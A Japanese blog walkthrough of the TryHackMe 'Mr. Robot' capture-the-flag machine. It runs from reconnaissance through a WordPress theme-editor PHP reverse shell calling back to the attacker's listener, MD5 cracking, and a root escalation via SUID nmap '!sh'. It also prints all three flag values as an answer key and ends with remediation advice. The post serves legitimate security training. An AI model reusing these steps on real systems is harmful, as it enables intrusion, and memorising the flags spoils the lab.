@@ -1,0 +1,574 @@
+---
+title: "Mr. Robot CTFの攻略：初期潜入から権限昇格までの完全ウォークスルー"
+description: "TryHackMeの中級者向けルーム「Mr. Robot」を攻略するための包括的な技術ガイド。Webエニュメレーション、リバースシェルの確立、SUIDを利用した権限昇格までを解説。"
+publishedAt: 2021-05-23
+author: "Luka Piplica"
+tags: ["linux", "cybersecurity", "tryhackme", "ctf", "walkthrough"]
+featured: false
+locale: ja
+image: "../../../assets/blog/mr-robot-ctf/featured.webp"
+imageAlt: "ダークレッドのフィルターがかかったエリオット・アルダーソンのアップに『GOODBYE, FRIEND. MR. ROBOT』のテキストが添えられた、ドラマ『Mr. Robot』のポスター"
+---
+
+TryHackMeの「Mr. Robot」は、大ヒットテレビドラマシリーズにインスパイアされた、中級難易度のクラシックな仮想マシン（CTF）です。このウォークスルーでは、初期のネットワーク偵察（リコン）やWebディレクトリへのブルートフォース攻撃から、リバースシェルの安定化、そして設定ミスのあるSUIDバイナリを悪用したroot権限昇格に至るまで、エンドツーエンドの脆弱性悪用（エクスプロイト）プロセスを網羅します。
+
+---
+
+## 環境および使用ツール
+
+エクスプロイトプロセスを開始するには、まずOpenVPNを介してTryHackMeネットワークへの安全な接続を確立する必要があります。本環境では、Kali Linuxディストリビューションに標準で組み込まれている以下のネイティブツールを使用します：
+
+* **Nmap：** ネットワーク探索およびサービスディスカバリ（ポートスキャン）。
+* **Gobuster：** ディレクトリおよびファイルのブルートフォース（強制探索）。
+* **Netcat：** 任意のデータインジェクションおよびリバースシェルのリスン（待ち受け）。
+* **Python：** TTYシェルの安定化。
+
+---
+
+## フェーズ 1：初期アクセスとネットワーク偵察（リコン）
+
+ターゲットに対してアクティブスキャンを実行する前に、TryHackMeのインフラストラクチャへの安全なトンネルを確立し、その後にアタックサーフェス（攻撃対象領域）をマッピングするための徹底的なポートスキャンを行う必要があります。
+
+### OpenVPN接続の確立
+
+1. 公式の <a href="https://tryhackme.com/access" target="_blank" rel="noopener noreferrer">TryHackMeアクセスベージ</a> から、カスタム設定プロファイル（`.ovpn`）をダウンロードします。
+2. root権限（管理者権限）を使用して、OpenVPN CLIユーティリティで接続を初期化します：
+
+    ```shell
+    sudo openvpn <YOUR_FILENAME>.ovpn
+    ```
+
+3. トンネルインターフェース（`tun0`）がアクティブであり、ラボのサブネット内のIPアドレスが正常に割り当てられていることを確認します。
+
+### ネットワークエニュメレーション（情報収集）
+
+まず、どのポートが開いているかを確認する必要があります。ターゲットシステムに関する情報が多ければ多いほど、攻撃の選択肢が広がります。ここでは、ネットワークスキャンを実行するためにNmapを使用します。
+
+#### Nmapによるスキャン
+
+ターゲットマシンに対してアグレッシブなサービススキャン（`-A`）を実行し、オープンポート、オペレーティングシステムの詳細、および稼働しているサービスのバージョンを特定します：
+
+```shell
+nmap -A <TARGET_IP>
+```
+
+### Nmapスキャン結果
+
+```shell
+kali@kali:-/Desktop$ nmap 10.10.51.194 -A
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 18:35 CEST
+Nmap scan report for 10.10.38.44
+Host is up (0.095s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03    
+
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds
+```
+
+ご覧の通り、ポート80がオープンしていることから、これがHTTPプロトコル上で動作するWebサイトであることが分かります。次のステップとして、ディレクトリのブルートフォース（強制探索）を実行し、Webサーバー上の隠されたディレクトリやファイルを特定していきます。
+
+---
+
+## フェーズ 2：Webディレクトリの探索
+
+ディレクトリのエニュメレーション（列挙）を行うには、質の高いワードリストと高速なブルートフォースツールが必要です。ここでは、ワードリストに**SecLists**を、列挙フェーズのツールに**Gobuster**を使用します。
+
+### SecListsのインストール
+
+システムにまだインストールされていない場合は、`apt` を使用してSecListsの完全なコレクションをインストールできます：
+
+```shell
+sudo apt install seclists
+```
+
+このコマンドを実行すると、ワードリストが `/usr/share/seclists/` ディレクトリ内で利用可能になります。
+
+### Gobusterを使用したディレクトリのエニュメレーション
+
+Gobusterのディレクトリモード（`dir`）を使用し、ターゲットのURLを指定した上で、SecListsの `common.txt` ワードリストを活用してWebサーバー上のアクティブなエンドポイントを検出します：
+
+```shell
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+#### Gobusterのスキャン結果
+
+```shell
+kali@kali:~/Desktop$ gobuster dir -u http://10.10.51.194/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.51.194/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/23 18:27:45 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 213]
+/.htaccess            (Status: 403) [Size: 218]
+/.htpasswd            (Status: 403) [Size: 218]
+/0                    (Status: 301) [Size: 0] [--> http://10.10.51.194/0/]
+/Image                (Status: 301) [Size: 0] [--> http://10.10.51.194/Image/]
+/admin                (Status: 301) [Size: 234] [--> http://10.10.51.194/admin/]
+/atom                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/atom/]
+/audio                (Status: 301) [Size: 234] [--> http://10.10.51.194/audio/]  
+/blog                 (Status: 301) [Size: 233] [--> http://10.10.51.194/blog/]   
+/css                  (Status: 301) [Size: 232] [--> http://10.10.51.194/css/]    
+/dashboard            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-admin/] 
+/favicon.ico          (Status: 200) [Size: 0]                                     
+/feed                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]     
+/images               (Status: 301) [Size: 235] [--> http://10.10.51.194/images/] 
+/image                (Status: 301) [Size: 0] [--> http://10.10.51.194/image/]    
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.51.194/]          
+/index.html           (Status: 200) [Size: 1188]                                  
+/js                   (Status: 301) [Size: 231] [--> http://10.10.51.194/js/]     
+/intro                (Status: 200) [Size: 516314]                                
+/license              (Status: 200) [Size: 309]                                   
+/login                (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php]
+/page1                (Status: 301) [Size: 0] [--> http://10.10.51.194/]            
+/phpmyadmin           (Status: 403) [Size: 94]                                               
+/readme               (Status: 200) [Size: 64]                                               
+/rdf                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/rdf/]            
+/robots               (Status: 200) [Size: 41]                                               
+/robots.txt           (Status: 200) [Size: 41]                                               
+/rss                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
+/rss2                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
+/sitemap              (Status: 200) [Size: 0]                                                
+/sitemap.xml          (Status: 200) [Size: 0]                                                
+/video                (Status: 301) [Size: 234] [--> http://10.10.51.194/video/]             
+/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.51.194/wp-admin/]          
+/wp-content           (Status: 301) [Size: 239] [--> http://10.10.51.194/wp-content/]
+/wp-config            (Status: 200) [Size: 0]                                        
+/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.51.194/wp-includes/]
+/wp-cron              (Status: 200) [Size: 0]                                         
+/wp-links-opml        (Status: 200) [Size: 227]                                       
+/wp-load              (Status: 200) [Size: 0]                                         
+/wp-login             (Status: 200) [Size: 2606]                                      
+/wp-mail              (Status: 500) [Size: 3064]                                      
+/wp-settings          (Status: 500) [Size: 0]                                         
+/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php?action=register]
+/xmlrpc               (Status: 405) [Size:42]                                                      
+===============================================================
+2021/05/23 18:40:33 Finished
+===============================================================
+```
+
+---
+
+## フェーズ 3：キー #1（第1のフラグ）の抽出
+
+ディレクトリのエニュメレーション結果を検証すると、いくつかの重要度の高いエンドポイントが浮かび上がってきます。複数の `/wp-` パスが存在することから、ターゲットがWordPress CMSを稼働させていることが確認できます。さらに、`/robots.txt` および `/robots` ファイルへは即座にアクセス可能な状態です。
+
+ウェブブラウザでターゲットのIPアドレスに直接アクセスすると、ドラマシリーズにインスパイアされた、以下のようなインタラクティブなカスタムランディングページが表示されます：
+
+![ターゲットのランディングページ](../../../assets/blog/mr-robot-ctf/1.webp)
+
+初期の侵入ポイントを見つけるため、`http://<TARGET_IP>/robots.txt` にアクセスして `/robots.txt` ファイルの内容を検査します。ウェブサーバーはこのディレクトリ内で2つの特定のファイルを公開しています：
+
+![robots.txtの検査](../../../assets/blog/mr-robot-ctf/2.webp)
+
+出力結果から、以下の2つのリソースが存在することが判明します：
+* `fsociety.dic` — 後ほど認証へのブルートフォース（強制探索）攻撃を実行する際に役立つ可能性が高い、カスタムのワードリストファイル。
+* `key-1-of-3.txt` — 目的とする第1のフラグ（キー）が格納されている場所。
+
+### 第1のキーのダウンロード
+
+トークンはブラウザ上で直接確認することもできますが、以下のように `curl` ユーティリティを使用して、ターミナル経由で綺麗にダウンロードまたは読み取ることも可能です：
+
+```shell
+curl -s http://<TARGET_IP>/key-1-of-3.txt
+```
+
+#### 出力結果
+
+```shell
+kali@kali:~/Desktop$ curl -s http://10.10.51.194/key-1-of-3.txt
+
+073403c8a58a1f80d943455fb30724b9
+```
+**キー #1 の確保：** 073403c8a58a1f80d943455fb30724b9
+
+---
+
+## フェーズ 4：Web認証の突破とブルートフォース攻撃
+
+最初のフラグを確保したところで、次はシステムへの初期アクセス（侵入）に焦点を移します。先ほどのGobusterのスキャン結果では、複数のWordPressエンドポイント、特に `/wp-login.php` が明確に示されていました。
+
+### WordPressログインフォームの解析
+
+`http://<TARGET_IP>/wp-login.php` にアクセスすると、以下のような標準的なWordPressの認証パネルが表示されます：
+
+![WordPressログインパネル](../../../assets/blog/mr-robot-ctf/3.webp)
+
+先へ進むには、有効な認証情報（資格情報）が必要です。任意の文字列でログインを試みると、このアプリケーションのエラーハンドリングにおいて興味深い挙動が確認できます。存在しないユーザー名を入力した場合、システムは以下のように明確なエラーメッセージを返します：
+
+> **アプリケーションからのヒント：** 「Invalid username.（ユーザー名が無効です）」
+
+この特定のエラー設定の不備（情報漏えい）を突くことで、ユーザー名のエニュメレーション（列挙）が可能になります。有効なユーザー名を特定できれば、エラーメッセージは「パスワードが間違っています」という内容に変化するため、そのユーザーがシステム内に存在していることを裏付けることができます。
+
+### ワードリスト（`fsociety.dic`）の準備
+
+ブルートフォース攻撃を実行する前に、先ほど `/robots.txt` で発見したカスタム辞書ファイルを確保する必要があります。`curl` を使用してダウンロードします：
+
+```shell
+curl -o fsociety.dic http://<TARGET_IP>/fsociety.dic
+```
+
+ワードリストをダウンロードした後、そのサイズと構造を検査できます。簡単な解析を行うと、`fsociety.dic` には85万語を超える膨大な単語が格納されていることが分かります。しかし、このリストには数千個もの重複エントリが含まれており、そのまま使用するとブルートフォースの試行速度が不必要に低下してしまいます。そこで、ファイルをソート（並び替え）し、一意の（重複のない）エントリのみを抽出することでリストを最適化します：
+
+```shell
+sort -u fsociety.dic > fsociety_unique.dic
+```
+
+これにより、辞書のサイズを85万語以上から約11,000語の一意の単語へと削減することができ、ブルートフォースフェーズの大幅な高速化を実現できます。
+
+### ユーザー名およびパスワードのエニュメレーション
+
+最適化したワードリストを使用し、**WPScan** や **Hydra** などのツールを用いてWordPressのログインフォームを標的に設定し、有効なユーザー名とパスワードを割り出します。まずは、有効なユーザー名の列挙を行います：
+
+```shell
+wpscan --url http://<TARGET_IP>/ -U fsociety_unique.dic --enumerate u
+```
+
+このスキャンにより、ユーザー名 `elliot` が迅速に特定されます。
+
+しかし、最適化したワードリストを使って `elliot` アカウントのパスワードをブルートフォースするために計算時間を費やす代わりに、先ほどのGobusterによるディレクトリ探索結果をさらに深く検証することで、より短時間で突破できる経路が見つかります。
+
+### 隠された認証情報の発見
+
+Gobusterのディレクトリ探索ログには、ステータスコード `200 OK` を返す `/license` というエンドポイントが記録されていました。このエンドポイントに対して `curl` でリクエストを送信すると、一見すると不可解なライセンス告知テキストが返ってきます。ここで極めて重要なのは、ドキュメントの最下部までスクロールするか、不要な空白（ホワイトスペース）を取り除くと、末尾に隠されたBase64形式の文字列が埋め込まれているのが見つかる点です：
+
+```shell
+curl -s http://<TARGET_IP>/license | tr -d "\n"
+```
+
+#### 出力結果
+
+```shell
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a    password or something? ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+
+末尾にある `ZWxsaW90OkVSMjgtMDY1Mgo=` という特定の文字列は、Base64でエンコードされた認証情報の可能性が非常に高いと考えられます。
+
+### Base64文字列のデコード
+
+この文字列は、ターミナル上で直接デコードすることができます：
+
+```shell
+echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+```
+
+#### 出力結果
+
+```shell
+elliot:ER28-0652
+```
+
+大成功です！デコードされた出力結果から、`ユーザー名:パスワード` の形式で有効な認証情報が手に入りました：
+* **ユーザー名：** `elliot`
+* **パスワード：** `ER28-0652`
+
+> **トリビア：** パスワードの `ER28-0652` は、ドラマ『Mr. Robot』の作中でエリオット・アルダーソンが勤務していた「オールセーフ・サイバーセキュリティ（Allsafe Cybersecurity）」における彼の社員識別番号（ID）を再現した小粋な演出です。
+
+---
+
+## フェーズ 5：初期アクセスの獲得（リバースシェルの確立）
+
+管理者権限の認証情報が手に入ったため、WordPressのバックエンドにログインし、その背後で動作しているサーバー上でリモートコード実行（RCE）の成立を試みます。
+
+### WordPress管理パネルへのログイン
+
+1. `http://<TARGET_IP>/wp-login.php`（または `/login`）にアクセスします。
+2. 先ほど回収した認証情報（`elliot` / `ER28-0652`）を入力してログインします。
+3. 認証に成功すると、WordPressのメイン管理ダッシュボードにリダイレクトされます。ダッシュボードの右下（または左下）を確認すると、バージョンが **4.3.1** であることが表示されます。これは非常に古いバージョンであり、テーマ編集機能を悪用したエクスプロイトベクターに対して脆弱であることが広く知られています。
+
+![WordPress管理ダッシュボード](../../../assets/blog/mr-robot-ctf/4.webp)
+
+### テーマエディタを悪用したリモートコード実行（RCE）
+
+管理者レベルの権限を持っているため、組み込みのテーマエディタ機能を利用してカスタムのPHPスクリプトをインジェクション（挿入）し、システムコマンドを実行させることができます。
+
+1. 左側のナビゲーションパネルから **「Appearance（外観）」 > 「Theme Editor（テーマエディタ）」** を選択します。
+
+![テーマエディタへの移動](../../../assets/blog/mr-robot-ctf/5.webp)
+
+2. 有効化されているテーマ（通常は *Twenty Fifteen*）のテンプレート一覧から、**「404 Template」**（`404.php`）を探し出します。
+
+![404.phpテンプレートの特定](../../../assets/blog/mr-robot-ctf/6.webp)
+
+3. デフォルトの `404.php` テンプレートの内容を、カスタムのPHPリバースシェルスクリプトに置き換えます。ここでは、ペネトレーションテストで広く信頼されている <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">PentestMonkeyのPHP Reverse Shell</a> を使用します。
+4. スクリプトをダウンロードし、設定変数（`$ip` および `$port`）を、自身のKali LinuxマシンのローカルIPアドレス（`tun0` インターフェースに割り当てられているIP）と、任意のポート番号（例：`1234`）を指すように書き換えます：
+
+    ```php
+    $ip = '10.10.x.x';  // 自身のローカルKaliマシンの tun0 IPに置き換え
+    $port = 1234;       // 自身が待ち受けるローカルのポート番号
+    ```
+
+5. 更新したコードをコピーし、WordPressのエディタにすべて貼り付け、`404.php` の元の内容を上書きします。**「Update File（ファイルを更新）」** をクリックして変更を保存します。
+
+> **重要：** ペイロードを設定する前に、Kali側で `ip a` または `ifconfig` コマンドを使用し、`tun0` インターフェースの正確なローカルIPを取得していることを確認してください。
+
+### Netcatリスナーのセットアップ
+
+ペイロードを実行（トリガー）する前に、Kaliマシン側でローカルポートリスナーを設定し、入ってくる接続を待ち受ける状態にする必要があります：
+
+```shell
+nc -nlvp 1234
+```
+
+### リバースシェルの実行
+
+インジェクションしたPHPコードを実行するために、存在しないページにアクセスして404エラーページを発生させるか、変更したテンプレートのURLに直接アクセスしてペイロードをトリガーします：
+
+```shell
+curl -s http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php
+```
+
+あるいは、ブラウザで単純に `http://<TARGET_IP>/doesnotexist` にアクセスするだけでも、このテンプレートをトリガーできます。ターミナルに戻ると、Netcatリスナーが接続を正常にキャッチし、シェルを獲得できていることが確認できます：
+
+![キャッチされたNetcatリバースシェル](../../../assets/blog/mr-robot-ctf/7.webp)
+
+---
+
+## フェーズ 6：ローカルエニュメレーションとユーザー権限の昇格
+
+リバースシェルによって接続は確立されたものの、このシェルは非常に制限されています。現在の権限を確認すると、権限の低いサービスアカウントとして実行されていることが分かります：
+
+```shell
+$ whoami
+daemon
+```
+
+### シェルの安定化（TTYシェルの生成）
+
+Netcatでキャッチした標準的なリバースシェルは、コマンド履歴やタブ補完、ジョブ制御といった基本機能が欠落している、いわゆる「ダムシェル（機能の低いシェル）」です。そのため、`su` や `sudo` といったコマンドを実行しようとしても失敗してしまいます。まずは、完全に対話可能なTTYシェルを生成するために、ホストマシンにPythonがインストールされているか確認します：
+
+```shell
+$ which python
+/usr/bin/python
+```
+
+Pythonが利用可能であることが確認できたため、`pty` モジュールを使用して対話型のbashセッションを生成します：
+
+```shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+これによりセッションが完全に対話型のTTYシェルへとアップグレードされ、より複雑なシステムコマンドを実行できるようになります。
+
+### ホームディレクトリの調査
+
+有効なシステムユーザーを見つけるため、`/home` ディレクトリ内の一覧を表示します：
+
+```shell
+ls -la /home
+出力結果には、`robot` という名前のユーザーが表示されます。
+```
+
+`/home/robot` ディレクトリの中身を調査すると、2つの重要なファイルが存在していることが分かります：
+
+```shell
+$ ls -l /home/robot
+total 8
+-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+```
+
+`key-2-of-3.txt` には2つ目のフラグが含まれていることが分かりますが、厳格な読み取り専用権限（`-r--------`）が設定されており、所有者である `robot` ユーザーしか読むことができません。しかし、もう1つのファイルである `password.raw-md5` は、すべてのユーザーが読み取り可能な状態（ワールドリーダブル）になっています：
+
+```shell
+$ cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+これにより、ユーザー `robot` のMD5パスワードハッシュが得られます。
+
+### MD5パスワードハッシュのクラック
+
+このハッシュ `c3fcd3d76192e4007dfb496cca67e13b` は、ソルトなし（unsalted）の標準的なMD5で暗号化されたパスワードです。MD5は暗号強度としては脆弱なため、簡単に対照データと照合、あるいはクラックすることができます。GromwebやCrackStationといったオンラインのMD5データベース検索サービスを利用するか、ローカル環境で **Hashcat** や **John the Ripper** などのツールを使って解析を行います：
+
+```shell
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+ハッシュを解析すると、以下の平文テキスト（プレーンテキスト）が得られます：
+`abcdefghijklmnopqrstuvwxyz`
+
+* **ユーザー名：** `robot`
+* **パスワード：** `abcdefghijklmnopqrstuvwxyz`
+
+### Robotユーザーへの切り替え
+
+これで、クラックして手に入れた認証情報を使用し、権限の低い `daemon` ユーザーから `robot` ユーザーへとローカル環境内での権限昇格を行うことができます：
+
+```shell
+$ su - robot
+Password: abcdefghijklmnopqrstuvwxyz
+robot@mercury:~$ whoami
+robot
+```
+
+### 2つ目のフラグの回収
+
+`robot` ユーザーの権限を手に入れたことで、先ほどはアクセス拒否された2つ目のフラグファイルを読み取ることができるようになります：
+
+```shell
+robot@mercury:~$ cat /home/robot/key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+**2つ目のフラグの確保に成功：** `822c73956184f694993bede3eb39f959`
+
+---
+
+## フェーズ 7：Rootへの権限昇格
+
+3つのキー（フラグ）のうち2つを確保し、最終目的は最高権限である `root` へと権限を昇格させ、通常は `/root` ディレクトリ内に保管されている3つ目のキーを回収することです。
+
+### Sudo権限の確認
+
+まず、`robot` ユーザーにsudo経由で実行可能な管理権限（管理者コマンド）が割り当てられているかどうかを確認します：
+
+```shell
+robot@mercury:~$ sudo -l
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+Sorry, user robot may not run sudo on linux.
+```
+
+このユーザーは sudoers グループに含まれていません。そのため、別の権限昇格ベクトル（侵入ルート）を探す必要があります。
+
+### SUIDバイナリの特定
+
+Linuxにおけるローカル権限昇格の一般的なベクトルの1つに、SUID（Set Owner User ID）ビットが設定された、設定不備のあるバイナリの悪用があります。SUIDビットが設定されたバイナリが実行されると、それを実行したユーザーではなく、そのファイルの所有者（この場合は `root`）の権限で実行されます。
+
+ファイルシステム全体から、`root` が所有するSUIDバイナリを検索します：
+
+```shell
+find / -user root -perm -4000 -print 2>/dev/null
+```
+
+#### 出力結果
+
+```shell
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+検索結果の一覧に、極めて異例のエントリが表示されています：`/usr/local/bin/nmap`
+
+### SUID Nmapの悪用（インタラクティブモード）
+
+Nmapバイナリの権限とバージョンを確認します：
+
+```shell
+$ ls -l /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+```
+
+所有者の権限部分（`-rwsr-xr-x`）にある `s` は、SUIDビットが設定されていることを示しており、所有者が `root` であることが確認できます。次に、Nmapのバージョンを調査します：
+
+```shell
+$ /usr/local/bin/nmap --version
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+```
+
+Nmapのバージョンが **3.81** であることが確認できました。古いバージョンのNmap（具体的にはバージョン `2.02` から `5.21` の間）には、ユーザーが対話型環境でコマンドやスクリプトを実行できるように設計された**インタラクティブモード**（interactive mode）が搭載されています。このバイナリはSUIDの設定によりroot権限で動作するため、インタラクティブコンソール内からシェルを起動すると、セッションを直接 `root` へと昇格させることができます。
+
+1. インタラクティブモードでNmapを起動します：
+    ```shell
+    /usr/local/bin/nmap --interactive
+    ```
+
+2. インタラクティブプロンプト（`nmap>`）の内部で、感嘆符 `!` を頭に付けることで、プログラムを抜けてシェルを起動（エスケープ）します：
+    ```shell
+    nmap> !sh
+    ```
+
+3. 新しく獲得した権限を確認します：
+    ```shell
+    # whoami
+    root
+    ```
+
+システム上のすべての制限をバイパスし、完全な管理者権限（root権限）でコマンドを実行できるようになりました。
+
+### 3つ目のフラグの回収
+
+`/root` ディレクトリへと移動し、最後のフラグファイルを確認します：
+
+```shell
+# ls -la /root
+total 28
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Nov 13  2015 ..
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+```
+
+最後のテキストファイルの内容を読み取ります：
+
+```shell
+# cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+**3つ目のフラグの確保に成功：** `04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+## 結論とセキュリティ推奨事項
+
+TryHackMeの「Mr. Robot CTF」は、複数段階にわたるシステム侵入（エクスプロイト）を学ぶための優れた教材です。公開されたBase64文字列、脆弱なパスワードハッシュ、旧世代のソフトウェア、そしてSUID権限の設定不備といった、個々には小さく見える脆弱性や設定ミスが連鎖することで、最終的にサーバー全体の権限（フルコントロール）が乗っ取られるリスクを明確に示しています。
+
+### 対策・修正ガイドライン
+
+1. **Webルートの整理と権限の見直し：** 機密ファイル（`.dic` 辞書ファイルやカスタムテキストファイルなど）を、外部公開されているWebサーバーのルートディレクトリに配置してはいけません。また、`/robots.txt` はアクティブなシステム資産や認証情報を暴露する目的で使用すべきではありません。
+2. **旧式のCMSバージョンの廃止：** WordPress 4.3.1のような古いソフトウェアパッケージには重大な脆弱性が存在します。すべてのWebアプリケーション、プラグイン、および中核となるCMSシステムを、最新の安定した修正パッチ（バージョン）にアップグレードしてください。
+3. **SUID設定の定期監査：** システム内に不要なSUID/SGIDバイナリが存在しないか定期的にスキャンしてください。Nmapやコンパイラ、テキストエディタといった強力な実行機能を持つユーティリティにSUID権限を付与してはいけません。特定のタスクでroot権限の実行が必要な場合は、`/etc/sudoers` 内に厳格なルールを定義して制御してください。
+4. **堅牢なパスワードポリシーの導入：** 認証情報を平文（テキスト）のまま放置したり、標準的なMD5ハッシュスキームのみで保護したりすることは避けてください。すべての認証情報は、ソルト（Salt）を併用した強力かつ現代的なハッシュアルゴリズム（例：bcrypt、Argon2など）で保護する必要があります。
+
+---
+
+## フラグ回収の振り返り（台帳）
+
+今回のペネトレーションテスト（侵入実験）を通じて回収された最終的なキーの一覧です：
+
+| 問題 / キーの場所 | 回収されたハッシュ |
+| :--- | :--- |
+| **キー #1** (`/robots.txt` / Webサーバーのルート) | `073403c8a58a1f80d943455fb30724b9` |
+| **キー #2** (`/home/robot/key-2-of-3.txt`) | `822c73956184f694993bede3eb39f959` |
+| **キー #3** (`/root/key-3-of-3.txt`) | `04787ddef27c3dee1ee161b21670b4e4` |
+
+*※本ウォークスルー（解説）は教育目的でのみ提供されており、安全なシステム構成、堅牢なアクセス制御、およびプロアクティブなパッチ管理の重要性を実証することを目的としています。*
